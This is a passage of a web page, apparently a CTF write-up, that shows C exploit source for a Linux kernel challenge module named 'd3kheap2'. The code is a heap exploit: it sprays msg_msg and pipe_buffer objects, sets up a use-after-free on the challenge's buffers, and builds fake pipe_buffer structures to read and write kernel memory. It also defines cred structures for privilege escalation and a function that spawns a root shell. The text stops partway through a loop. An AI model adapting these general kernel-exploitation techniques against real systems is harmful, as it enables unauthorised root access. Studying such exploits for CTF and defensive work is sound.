class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kernel Pwn Infrastructures</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg)    <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg)       <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR_MSG(msg)      <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_GRANULARITY 0x10000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KASLR_MASK (~(KASLR_GRANULARITY - 1))</span><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Error at: &quot;</span>) <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[*] Process binded to core &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] Failed to get the root!&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    log_success(<span class="hljs-string">&quot;[+] Successful to get the root.&quot;</span>);<br>    log_info(<span class="hljs-string">&quot;[*] Execve root shell now...&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* to exit the process normally, instead of potential segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">long</span> usage;<br>    <span class="hljs-type">uint32_t</span> uid;<br>    <span class="hljs-type">uint32_t</span> gid;<br>    <span class="hljs-type">uint32_t</span> suid;<br>    <span class="hljs-type">uint32_t</span> sgid;<br>    <span class="hljs-type">uint32_t</span> euid;<br>    <span class="hljs-type">uint32_t</span> egid;<br>    <span class="hljs-type">uint32_t</span> fsuid;<br>    <span class="hljs-type">uint32_t</span> fsgid;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Challenge Interface</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_OBJ_ALLOC  0x3361626e</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_OBJ_FREE   0x74747261</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_OBJ_EDIT   0x54433344</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_OBJ_SHOW   0x4e575046</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kheap2_ureq</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kheap2_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kheap2_ureq</span> <span class="hljs-title">ureq</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_ALLOC, &amp;ureq);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kheap2_free</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kheap2_ureq</span> <span class="hljs-title">ureq</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_FREE, &amp;ureq);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kheap2_edit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kheap2_ureq</span> <span class="hljs-title">ureq</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_EDIT, &amp;ureq);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">d3kheap2_show</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">d3kheap2_ureq</span> <span class="hljs-title">ureq</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> ioctl(fd, D3KHEAP2_OBJ_SHOW, &amp;ureq);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Exploitation procedure</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_BUF_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_OBJ_SZ 2048</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMALLOC_2K_OBJ_PER_SLUB 16</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NR 0x400</span><br><span class="hljs-comment">/* it cannot be big because the system limits that */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SCAVENGER_SZ (D3KHEAP2_OBJ_SZ - 0x30)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_SZ (0x1000 - 0x30 + D3KHEAP2_OBJ_SZ - 8)</span><br><span class="hljs-comment">/* prepare_copy() will do allocation, so we use bigger size for msg_msgseg */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_PEEK_SZ (0x1000 - 0x30 + 0x1000 - 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG_BASE 0x3361626e74747261</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_FCNTL_SZ (0x1000 * 32)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x180</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_pipe_buf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">pipe_ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> pipe_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_private;<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], atk_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> victim_pipe, ovlp_pipe;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> page_addr,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *buf,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params">    <span class="hljs-type">int</span> atk_msgq,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> *msg_buf,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> msgsz,</span><br><span class="hljs-params">    <span class="hljs-type">long</span> msgtyp</span><br><span class="hljs-params">)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (read_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    fake_pipe_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;msg_buf[<span class="hljs-number">511</span>];<br>    fake_pipe_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_pipe_buf-&gt;len = <span class="hljs-number">0xff8</span>;<br>    fake_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_pipe_buf-&gt;flags = pipe_flags;<br>    fake_pipe_buf-&gt;ops = pipe_ops;<br>    fake_pipe_buf-&gt;private = pipe_private;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = 0; i &lt; 0x80; i++) &#123;</span><br><span class="hljs-comment">        char ch[8];</span><br><span class="hljs-comment">        for (int j = 0; j &lt; 8; j++) &#123;</span><br><span class="hljs-comment">            ch[j] = &#x27;A&#x27; + i;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        msg_buf[500 + i] = *(size_t*) ch;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg to overwrite pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (read(atk_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xff0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to read from pipe&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to read from evil pipe!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> page_addr,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *buf,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> len,</span><br><span class="hljs-params">    <span class="hljs-type">int</span> atk_msgq,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> *msg_buf,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> msgsz,</span><br><span class="hljs-params">    <span class="hljs-type">long</span> msgtyp</span><br><span class="hljs-params">)</span><br>&#123;<br>    fake_pipe_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;msg_buf[<span class="hljs-number">516</span>];<br><br>    <span class="hljs-keyword">if</span> (read_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    fake_pipe_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_pipe_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_pipe_buf-&gt;ops = pipe_ops;<br><br>    <span class="hljs-keyword">if</span> (write_msg(atk_msgq, msg_buf, msgsz, msgtyp) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg to overwrite pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    <span class="hljs-keyword">if</span>(write(atk_pipe[<span class="hljs-number">1</span>], buf, len) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to write into pipe&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to write into evil pipe!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D3KHEAP2_BUF_SPRAY_NR D3KHEAP2_BUF_NR</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">leak_pipe_buf</span>;</span><br>    <span class="hljs-type">int</span> reclaim_msgq[MSG_QUEUE_NR], atk_msgq;<br>    <span class="hljs-type">int</span> vuln_msgq[MSG_QUEUE_NR], evil_msgq[MSG_QUEUE_NR];<br>    <span class="hljs-type">int</span> vulq_idx, vulm_idx, evilq_idx, evilm_idx, found;<br>    <span class="hljs-type">size_t</span> pipe_spray_nr, msg_spray_nr;<br>    <span class="hljs-type">int</span> d3kheap2_fd;<br>    <span class="hljs-type">char</span> err_msg[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], msg_buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> kernel_leak, current_pcb_page, *comm_addr;<br>    <span class="hljs-type">uint32_t</span> uid, gid;<br>    <span class="hljs-type">uint64_t</span> cred_kaddr, cred_kpage_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred_data</span>;</span><br>    <span class="hljs-type">char</span> cred_data_buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> errno;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">rl</span>;</span><br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing env...&quot;</span>);<br><br>    rl.rlim_cur = <span class="hljs-number">4096</span>;<br>    rl.rlim_max = <span class="hljs-number">4096</span>;<br>    <span class="hljs-keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rl) == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] setrlimit&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to expand file descriptor&#x27;s limit!&quot;</span>);<br>    &#125;<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    d3kheap2_fd = open(<span class="hljs-string">&quot;/proc/d3kheap2&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (d3kheap2_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;[x] Unable to open chal fd&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/d3kheap2!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing msg_queue...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((reclaim_msgq[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(<br>                err_msg,<br>                <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;[x] Unable to allocate no.%d reclaim msg_queue&quot;</span>,<br>                i<br>            );<br>            perror(err_msg);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_queue for clearing partial SLUB!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((vuln_msgq[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(<br>                err_msg,<br>                <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;[x] Unable to allocate no.%d vuln msg_queue&quot;</span>,<br>                i<br>            );<br>            perror(err_msg);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_queue to be UAF!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((evil_msgq[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(<br>                err_msg,<br>                <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;[x] Unable to allocate no.%d evil msg_queue&quot;</span>,<br>                i<br>            );<br>            perror(err_msg);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_queue to be evil!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (atk_msgq = get_msg_queue() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to allocate attacker msg_queue&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_queue for attacking!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing msg_msg...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; MSG_SPRAY_NR; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write_msg(<br>                reclaim_msgq[i],<br>                buf,<br>                <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>,<br>                MSG_TAG_BASE + j<br>            ) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">snprintf</span>(<br>                    err_msg,<br>                    <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                    <span class="hljs-string">&quot;[x] Unable to prealloc %d-%d 4k msg_msg\n&quot;</span>,<br>                    i,<br>                    j<br>                );<br>                perror(err_msg);<br>                err_exit(<span class="hljs-string">&quot;FAILED to spray msg_msg!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing pipe_buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">snprintf</span>(<br>                err_msg,<br>                <span class="hljs-keyword">sizeof</span>(err_msg) - <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;[x] Unable to create %d pipe\n&quot;</span>,<br>                i<br>            );<br>            perror(err_msg);<br>            err_exit(<span class="hljs-string">&quot;FAILED to prepare pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Spraying d3kheap2 buffer...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((errno = d3kheap2_alloc(d3kheap2_fd, i)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERROR_MSG(<span class="hljs-string">&quot;FAILED to allocate no.&quot;</span>)<span class="hljs-string">&quot;%d&quot;</span><br>                ERROR_MSG(<span class="hljs-string">&quot;d3kheap2 buffer! Retval: &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                errno<br>            );<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate d3kheap2 buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<br>        <span class="hljs-string">&quot;[*] Freeing d3kheap2 buffer into buddy &quot;</span><br>        <span class="hljs-string">&quot;and reclaiming as kmalloc-cg-2k SLUB page...&quot;</span><br>    );<br><br>    pipe_spray_nr = msg_spray_nr = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; D3KHEAP2_BUF_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((i / KMALLOC_2K_OBJ_PER_SLUB) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        